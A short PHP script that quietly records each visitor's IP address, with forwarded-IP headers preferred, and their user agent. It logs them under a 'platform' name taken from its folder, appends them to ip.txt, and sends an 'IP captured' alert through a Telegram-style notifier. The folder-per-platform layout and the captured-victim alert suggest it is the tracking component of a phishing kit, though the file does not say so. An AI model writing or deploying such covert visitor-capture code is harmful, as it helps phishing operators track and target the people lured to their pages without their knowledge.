<?php
require_once __DIR__ . '/../logger.php';

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
// Capture any forwarded IP headers
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$platform = basename(__DIR__);
$data = [
    'platform'   => $platform,
    'ip'         => $ip,
    'user_agent' => $ua,
];
log_event('ip', $data);
$msg = "[{$platform}] IP captured: {$ip}";
tg_notify($msg);
// Retain original behavior: still output a simple text file for backward compatibility (optional)
$file = __DIR__ . '/ip.txt';
$fp = fopen($file, 'a');
if ($fp) {
    fwrite($fp, "IP: $ip\r\n");
    fwrite($fp, "User-Agent: $ua\r\n");
    fclose($fp);
}
?>
